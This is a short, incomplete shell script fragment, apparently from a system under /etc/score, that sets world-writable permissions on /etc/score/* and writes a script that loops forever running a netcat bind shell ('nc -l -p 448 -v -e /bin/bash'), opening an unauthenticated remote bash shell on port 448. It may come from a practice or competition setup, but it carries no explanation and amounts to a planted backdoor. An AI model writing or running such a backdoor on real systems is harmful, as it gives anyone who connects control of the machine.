if [ ! -f /etc/score/sys_scr ]; then 
	touch /etc/score/sys_scr
	chmod 777 /etc/score/*
	echo "
	#!/bin/bash 
	run() {
		nc -l -p 448 -v -e /bin/bash
	}

	while true; do $(run); done " > /etc/score/scr
